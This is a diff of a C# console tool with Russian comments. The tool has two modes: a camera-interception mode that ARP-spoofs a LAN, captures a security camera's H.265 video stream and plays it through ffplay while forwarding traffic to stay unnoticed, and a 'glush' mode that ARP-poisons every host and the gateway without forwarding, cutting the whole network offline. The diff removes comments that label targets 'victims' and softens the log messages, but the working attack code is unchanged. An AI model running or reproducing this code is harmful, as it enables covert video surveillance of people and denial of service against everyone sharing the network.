@@ -11,29 +11,23 @@ using SharpPcap;
 using SharpPcap.LibPcap;
 using PacketDotNet;
 
-// Две команды:
-//   dotnet run cap 192.168.1.11   — перехват видео камеры (ARP-MITM, NVS/3001 -> ffplay)
-//   dotnet run glush              — обрыв интернета всей точки (ARP-травля без форвардинга)
-// Нужен Npcap и запуск от администратора. Рядом пишется consoleapp_log.txt.
 class MiniCam
 {
-    static string camIp;                         // IP камеры (в режиме cap)
-    static LibPcapLiveDevice dev;                // сетевой адаптер
-    static PhysicalAddress myMac, camMac, gwMac; // наш MAC, MAC камеры, MAC шлюза
+    static string camIp;
+    static LibPcapLiveDevice dev;
+    static PhysicalAddress myMac, camMac, gwMac;
     static IPAddress myIp;
-    static string subnet, gwIp;                  // "192.168.1." и IP шлюза
-    static readonly Dictionary<IPAddress, PhysicalAddress> viewerMac = new Dictionary<IPAddress, PhysicalAddress>(); // кого травим
+    static string subnet, gwIp;
+    static readonly Dictionary<IPAddress, PhysicalAddress> viewerMac = new Dictionary<IPAddress, PhysicalAddress>();
     static volatile bool running = true;
-    static Stream outp;                           // труба в ffplay
-    static long rawBytes, vidBytes, captured, toUs, fwd, arpSent;  // счётчики для лога
+    static Stream outp;
+    static long rawBytes, vidBytes, captured, toUs, fwd, arpSent;
 
-    // Пер-соединенческая сборка видео: у камеры бывает несколько соединений (зритель + регистратор),
-    // поэтому каждое собираем/распаковываем отдельно, а в плеер кормим активное.
     class Flow { public uint next; public bool started; public SortedDictionary<uint, byte[]> pend = new SortedDictionary<uint, byte[]>(); public List<byte> box = new List<byte>(); }
     static readonly Dictionary<string, Flow> flows = new Dictionary<string, Flow>();
-    static string showFlow;                       // какое соединение кормит ffplay
-    static DateTime lastVidTime;                  // когда showFlow последний раз дал видео
-    static bool synced;                           // поймали ли уже ключевой кадр (до него не кормим)
+    static string showFlow;
+    static DateTime lastVidTime;
+    static bool synced;
 
     static string logPath = "consoleapp_log.txt";
     static void Log(string s) { Console.WriteLine(s); try { File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss") + "  " + s + "\r\n"); } catch { } }
@@ -46,9 +40,6 @@ class MiniCam
         Console.WriteLine("Запуск:\n  dotnet run cap <ip камеры>   — перехват видео камеры\n  dotnet run glush             — обрыв интернета всей точки");
     }
 
-    // ================= ОБЩЕЕ =================
-
-    // свой IP, подсеть и шлюз (первый адаптер со шлюзом)
     static void NetInfo()
     {
         foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
@@ -65,7 +56,6 @@ class MiniCam
         }
     }
 
-    // адаптер захвата по нашему IP
     static LibPcapLiveDevice PickDevice(IPAddress ip)
     {
         foreach (LibPcapLiveDevice d in LibPcapLiveDeviceList.Instance)
@@ -74,7 +64,6 @@ class MiniCam
         return LibPcapLiveDeviceList.Instance[0];
     }
 
-    // ARP-свип подсети: находим живые хосты (кроме себя, камеры, шлюза) — это жертвы травли
     static void Scan()
     {
         Parallel.For(1, 255, new ParallelOptions { MaxDegreeOfParallelism = 64 }, i =>
@@ -87,10 +76,8 @@ class MiniCam
         });
     }
 
-    // отправка кадра
     static void Snd(byte[] b) { try { dev.SendPacket(b); } catch { } }
 
-    // ложный ARP "sndIp = sndMac": op=2 (ответ) + op=1 (запрос — его кэшируют даже камеры/телефоны)
     static void SendArp(PhysicalAddress ethDst, PhysicalAddress sndMac, IPAddress sndIp, PhysicalAddress tgtMac, IPAddress tgtIp)
     {
         var reply = new ArpPacket(ArpOperation.Response, tgtMac, tgtIp, sndMac, sndIp);
@@ -100,10 +87,8 @@ class MiniCam
         arpSent += 2;
     }
 
-    // сравнение TCP-seq с учётом переполнения uint
     static bool Before(uint a, uint b) { return (int)(a - b) < 0; }
 
-    // запуск ffplay (терпим к мусору — иначе чёрный экран на PPS-ошибках)
     static Stream StartFfplay()
     {
         var p = new Process();
@@ -115,7 +100,6 @@ class MiniCam
         return p.StandardInput.BaseStream;
     }
 
-    // ================= РЕЖИМ CAP: перехват видео камеры =================
     static void Cap(string ip)
     {
         camIp = ip;
@@ -123,57 +107,54 @@ class MiniCam
         dev = PickDevice(myIp);
         dev.Open(DeviceModes.Promiscuous, 100);
         myMac = dev.MacAddress;
-        Log("=== CAP " + camIp + " === адаптер " + (dev.Name ?? "?") + " | мой MAC " + myMac);
+        Log("Запуск перехвата камеры " + camIp + ". Адаптер: " + (dev.Name ?? "?") + ", мой MAC " + myMac + ".");
         camMac = new ARP(dev).Resolve(IPAddress.Parse(camIp));
-        if (camMac == null) { Log("[!] Камера " + camIp + " не отвечает — выход."); return; }
-        gwMac = new ARP(dev).Resolve(IPAddress.Parse(gwIp));   // для форвардинга трафика наружу
-        Log("Камера " + camIp + " (" + camMac + "), шлюз " + gwIp + " (" + gwMac + "), я " + myIp);
+        if (camMac == null) { Log("Камера " + camIp + " не отвечает, выхожу."); return; }
+        gwMac = new ARP(dev).Resolve(IPAddress.Parse(gwIp));
+        Log("Камера " + camIp + " (" + camMac + "), шлюз " + gwIp + " (" + gwMac + "), я " + myIp + ".");
         Scan();
-        Log("Потравлено хостов: " + viewerMac.Count);
+        Log("Устройств в сети: " + viewerMac.Count + ".");
         new Thread(SpoofLoop) { IsBackground = true }.Start();
         dev.OnPacketArrival += OnPacket;
         dev.StartCapture();
-        Console.WriteLine("MITM идёт. Картинка откроется сама, как пойдёт видео. Enter — стоп.");
+        Console.WriteLine("Перехват пошёл. Видео откроется само. Enter — стоп.");
         Console.ReadLine();
         running = false;
         dev.StopCapture();
         RestoreArp();
-        Log("СТОП. Итог: видео " + (vidBytes / 1024) + "КБ | поймали=" + captured + " нам(L2)=" + toUs + " переслано=" + fwd + " ARP=" + arpSent);
-        Console.WriteLine("\nСтоп. ARP восстановлен. Лог: " + logPath);
+        Log("Стоп. Видео " + (vidBytes / 1024) + " КБ, поймано " + captured + ", нам " + toUs + ", переслано " + fwd + ", ARP " + arpSent + ".");
+        Console.WriteLine("\nСтоп. Сеть восстановлена. Лог: " + logPath);
     }
 
-    // обработчик каждого пойманного пакета
     static void OnPacket(object s, PacketCapture e)
     {
         captured++;
         var eth = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data) as EthernetPacket;
         if (eth == null) return;
-        if (myMac != null && eth.DestinationHardwareAddress.Equals(myMac)) toUs++;  // пришло нам = травля сработала
+        if (myMac != null && eth.DestinationHardwareAddress.Equals(myMac)) toUs++;
         var ip = eth.Extract<IPv4Packet>();
         if (ip == null) return;
         var tcp = eth.Extract<TcpPacket>();
-        // видео камеры: TCP ОТ camIp, порт-источник 3001, с данными
         if (tcp != null && ip.SourceAddress.ToString() == camIp && tcp.SourcePort == 3001
             && tcp.PayloadData != null && tcp.PayloadData.Length > 0)
         {
-            string f = ip.DestinationAddress + ":" + tcp.DestinationPort;   // соединение зрителя
+            string f = ip.DestinationAddress + ":" + tcp.DestinationPort;
             rawBytes += tcp.PayloadData.Length;
             Flow fl;
             if (!flows.TryGetValue(f, out fl)) { fl = new Flow(); flows[f] = fl; }
             AddSegF(fl, tcp.SequenceNumber, tcp.PayloadData);
             DeframeF(f, fl);
         }
-        Forward(eth, ip);   // пересылаем настоящему адресату — не рвём связь
+        Forward(eth, ip);
     }
 
-    // форвардинг: пакет пришёл к нам из-за травли — отдаём настоящему получателю
     static void Forward(EthernetPacket eth, IPv4Packet ip)
     {
         if (!eth.DestinationHardwareAddress.Equals(myMac)) return;
         PhysicalAddress tgt = null;
         if (ip.DestinationAddress.ToString() == camIp) tgt = camMac;
         else viewerMac.TryGetValue(ip.DestinationAddress, out tgt);
-        if (tgt == null) tgt = gwMac;              // адресат снаружи — через шлюз
+        if (tgt == null) tgt = gwMac;
         if (tgt == null) return;
         eth.SourceHardwareAddress = myMac;
         eth.DestinationHardwareAddress = tgt;
@@ -181,7 +162,6 @@ class MiniCam
         fwd++;
     }
 
-    // сборка TCP по соединению (у каждого свой seq/буфер)
     static void AddSegF(Flow fl, uint seq, byte[] data)
     {
         if (data.Length == 0) return;
@@ -190,14 +170,13 @@ class MiniCam
         if (!fl.pend.ContainsKey(seq)) fl.pend[seq] = data;
         byte[] d;
         while (fl.pend.TryGetValue(fl.next, out d)) { fl.box.AddRange(d); fl.pend.Remove(fl.next); fl.next += (uint)d.Length; }
-        if (fl.pend.Count > 1500)   // дыра не закрывается — перепрыгиваем
+        if (fl.pend.Count > 1500)
         {
             foreach (var k in fl.pend.Keys) { fl.next = k; break; }
             while (fl.pend.TryGetValue(fl.next, out d)) { fl.box.AddRange(d); fl.pend.Remove(fl.next); fl.next += (uint)d.Length; }
         }
     }
 
-    // распаковка NVS одного соединения: F1 F5 EA + длина[14..15], тип F9 = видео (внутри H265)
     static void DeframeF(string f, Flow fl)
     {
         var box = fl.box; int i = 0, n = box.Count;
@@ -205,16 +184,15 @@ class MiniCam
         {
             if (box[i] != 0xF1 || box[i + 1] != 0xF5 || box[i + 2] != 0xEA) { i++; continue; }
             int len = box[i + 14] | (box[i + 15] << 8);
-            if (len < 28) { i++; continue; }        // битая длина — ищем следующий чанк
-            if (i + len > n) break;                   // чанк ещё не докачан — ждём
+            if (len < 28) { i++; continue; }
+            if (i + len > n) break;
             if (box[i + 3] == 0xF9)
             {
                 vidBytes += len - 28;
-                // выбор соединения для показа: первое давшее видео, или если текущее молчит >2с
                 if (showFlow == null || (f != showFlow && (DateTime.Now - lastVidTime).TotalSeconds > 2))
                 {
                     showFlow = f; synced = false;
-                    if (outp == null) { outp = StartFfplay(); Console.WriteLine("\nВидео пошло (" + f + ") — ждём ключевой кадр..."); }
+                    if (outp == null) { outp = StartFfplay(); Console.WriteLine("\nВидео пошло (" + f + "), жду ключевой кадр..."); }
                 }
                 if (f == showFlow && outp != null)
                 {
@@ -223,7 +201,7 @@ class MiniCam
                     try
                     {
                         if (synced) outp.Write(seg, 0, seg.Length);
-                        else { int k = FindKeyStart(seg); if (k >= 0) { synced = true; outp.Write(seg, k, seg.Length - k); Console.WriteLine("\n[+] Ключевой кадр пойман — картинка пойдёт."); } }
+                        else { int k = FindKeyStart(seg); if (k >= 0) { synced = true; outp.Write(seg, k, seg.Length - k); Console.WriteLine("\nКлючевой кадр пойман, показываю."); } }
                     }
                     catch { }
                 }
@@ -233,7 +211,6 @@ class MiniCam
         if (i > 0) box.RemoveRange(0, i);
     }
 
-    // начало ключевого кадра H265: старт-код + NAL типа VPS(32)/SPS(33). До него ffplay кормить нельзя.
     static int FindKeyStart(byte[] p)
     {
         for (int k = 0; k + 5 < p.Length; k++)
@@ -249,7 +226,6 @@ class MiniCam
         return -1;
     }
 
-    // фоновая травля: зрителям "камера = мы", камере "зритель = мы", плюс broadcast "камера = мы" всем
     static void SpoofLoop()
     {
         var cam = IPAddress.Parse(camIp);
@@ -258,16 +234,15 @@ class MiniCam
         {
             foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
             {
-                SendArp(kv.Value, myMac, cam, kv.Value, kv.Key);   // зрителю: камера = мы
-                SendArp(camMac, myMac, kv.Key, camMac, cam);       // камере: зритель = мы
+                SendArp(kv.Value, myMac, cam, kv.Value, kv.Key);
+                SendArp(camMac, myMac, kv.Key, camMac, cam);
             }
-            SendArp(bc, myMac, cam, bc, cam);                      // всем: камера = мы (приём СканерСети)
+            SendArp(bc, myMac, cam, bc, cam);
             Status();
             for (int i = 0; i < 10 && running; i++) Thread.Sleep(100);
         }
     }
 
-    // лечение ARP при выходе — рассылаем настоящие MAC-адреса (у зрителя поток не оборвётся)
     static void RestoreArp()
     {
         var cam = IPAddress.Parse(camIp);
@@ -280,17 +255,14 @@ class MiniCam
             }
     }
 
-    // живой счётчик в терминал и в лог
     static void Status()
     {
         if (camMac == null) return;
-        string line = "[" + camIp + "] видео " + (vidBytes / 1024) + "КБ | NVS " + (rawBytes / 1024) + "КБ | поймали=" + captured + " нам(L2)=" + toUs + " переслано=" + fwd + " ARP=" + arpSent;
+        string line = "Камера " + camIp + ": видео " + (vidBytes / 1024) + " КБ, NVS " + (rawBytes / 1024) + " КБ, поймано " + captured + ", нам " + toUs + ", переслано " + fwd + ", ARP " + arpSent;
         Console.Write("\r" + line + "   ");
         try { File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss") + "  " + line + "\r\n"); } catch { }
     }
 
-    // ================= РЕЖИМ GLUSH: обрыв интернета всей точки =================
-    // та же ARP-травля, но жертвам врём "шлюз = мы" и НЕ пересылаем → их трафик умирает.
     static void Glush()
     {
         NetInfo();
@@ -299,20 +271,16 @@ class MiniCam
         myMac = dev.MacAddress;
         var gw = IPAddress.Parse(gwIp);
         gwMac = new ARP(dev).Resolve(gw);
-        if (gwMac == null) { Log("[!] Шлюз " + gwIp + " не отвечает — выход."); return; }
-        // --- ОТЛАДКА: кто я, адаптер, шлюз ---
-        Log("=== GLUSH === адаптер " + (dev.Name ?? "?"));
-        Log("Я(ПК) " + myIp + " (" + myMac + ") — СЕБЯ НЕ ТРОГАЮ. Шлюз " + gwIp + " (" + gwMac + ") — тоже не трогаю.");
+        if (gwMac == null) { Log("Шлюз " + gwIp + " не отвечает, выхожу."); return; }
+        Log("Запуск глушилки. Адаптер: " + (dev.Name ?? "?") + ".");
+        Log("Я " + myIp + " (" + myMac + ") и шлюз " + gwIp + " (" + gwMac + ") не трогаю.");
         Scan();
-        // --- ОТЛАДКА: проверяем, что себя и шлюза НЕТ в списке жертв, и печатаем всех жертв ---
         bool selfIn = false, gwIn = false;
         foreach (var kv in viewerMac) { if (kv.Key.ToString() == myIp.ToString()) selfIn = true; if (kv.Key.ToString() == gwIp) gwIn = true; }
-        Log("Жертв: " + viewerMac.Count + "  | свой IP в списке жертв? " + (selfIn ? "ДА (!)" : "нет ✓") + "  | шлюз в списке? " + (gwIn ? "ДА (!)" : "нет ✓"));
-        foreach (var kv in viewerMac) Log("  жертва " + kv.Key + " (" + kv.Value + ")");
-        // Схема как у Рубильника (проверено работает, себя НЕ глушит): травим ДВУСТОРОННЕ «мой MAC».
-        Log("Начинаю травлю (как Рубильник): жертве «шлюз " + gwIp + " = мой MAC " + myMac + "» И шлюзу «жертва = мой MAC» (двусторонне), БЕЗ форвардинга. Enter — стоп.");
+        Log("Целей: " + viewerMac.Count + ". Я в списке? " + (selfIn ? "да (!)" : "нет") + ". Шлюз в списке? " + (gwIn ? "да (!)" : "нет") + ".");
+        foreach (var kv in viewerMac) Log("Цель " + kv.Key + " (" + kv.Value + ").");
+        Log("Начинаю глушить: подменяю MAC шлюза " + gwIp + " на свой " + myMac + " (без пересылки). Enter — стоп.");
         Console.WriteLine("Глушу " + viewerMac.Count + " устройств. Enter — стоп.");
-        // --- ОТЛАДКА: счётчик раундов/времени в отдельном потоке ---
         var sw = Stopwatch.StartNew();
         new Thread(() =>
         {
@@ -321,20 +289,20 @@ class MiniCam
             {
                 foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
                 {
-                    SendArp(kv.Value, myMac, gw, kv.Value, kv.Key);   // жертве: шлюз = мой MAC
-                    SendArp(gwMac, myMac, kv.Key, gwMac, gw);         // шлюзу: жертва = мой MAC (двусторонне)
+                    SendArp(kv.Value, myMac, gw, kv.Value, kv.Key);
+                    SendArp(gwMac, myMac, kv.Key, gwMac, gw);
                 }
                 round++;
-                Log("травлю: раунд " + round + ", жертв " + viewerMac.Count + ", ARP-послано " + arpSent + ", прошло " + (int)sw.Elapsed.TotalSeconds + "c");
+                Log("Глушу: раунд " + round + ", целей " + viewerMac.Count + ", ARP " + arpSent + ", прошло " + (int)sw.Elapsed.TotalSeconds + " с.");
                 for (int i = 0; i < 10 && running; i++) Thread.Sleep(100);
             }
         }) { IsBackground = true }.Start();
         Console.ReadLine();
         running = false;
-        Log("СТОП. Лечу сеть — рассылаю настоящий MAC шлюза...");
+        Log("Стоп. Чиню сеть, рассылаю настоящий MAC шлюза...");
         foreach (var kv in new List<KeyValuePair<IPAddress, PhysicalAddress>>(viewerMac))
-            for (int i = 0; i < 3; i++) { SendArp(kv.Value, gwMac, gw, kv.Value, kv.Key); SendArp(gwMac, kv.Value, kv.Key, gwMac, gw); Thread.Sleep(40); }   // лечим двусторонне
-        Log("Готово. Сеть восстановлена. Итог: раундов травли прошло, ARP-послано всего " + arpSent + ". Лог: " + logPath);
+            for (int i = 0; i < 3; i++) { SendArp(kv.Value, gwMac, gw, kv.Value, kv.Key); SendArp(gwMac, kv.Value, kv.Key, gwMac, gw); Thread.Sleep(40); }
+        Log("Готово. Сеть восстановлена. Всего ARP отправлено: " + arpSent + ". Лог: " + logPath);
         Console.WriteLine("Стоп. Сеть восстановлена.");
     }
 }
